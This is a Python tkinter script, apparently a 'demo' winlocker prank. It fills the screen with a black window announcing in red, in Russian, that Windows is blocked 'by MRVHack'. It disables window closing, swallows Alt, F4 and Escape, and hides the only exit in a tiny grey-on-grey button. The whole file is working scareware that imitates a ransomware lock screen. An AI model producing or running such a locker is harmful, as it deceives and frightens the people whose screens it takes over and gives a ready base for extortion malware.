import tkinter as tk
import sys

def demo_blocker():
    root = tk.Tk()
    root.title("")
    root.geometry("800x600")
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    def exit_demo():
        root.destroy()
        sys.exit(0)
    
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Маленькая серая кнопка в правом нижнем углу
    btn_exit = tk.Button(
        root, 
        text="выход", 
        command=exit_demo,
        font=("Arial", 8),
        bg="#404040",
        fg="#606060",
        activebackground="#404040",
        activeforeground="#606060",
        relief=tk.FLAT,
        borderwidth=0,
        padx=3,
        pady=1
    )
    btn_exit.place(x=760, y=570, width=30, height=15)
    
    label = tk.Label(
        root, 
        text="WINDOWS ЗАБЛОКИРОВАН by MRVHack!", 
        font=("Arial", 36, "bold"), 
        fg="red", 
        bg="black"
    )
    label.pack(expand=True)
    
    def on_keypress(event):
        if event.keysym in ('Alt_L', 'Alt_R', 'F4', 'Escape'):
            return "break"
    
    root.bind_all('<Key>', on_keypress)
    root.mainloop()

if __name__ == "__main__":
    demo_blocker()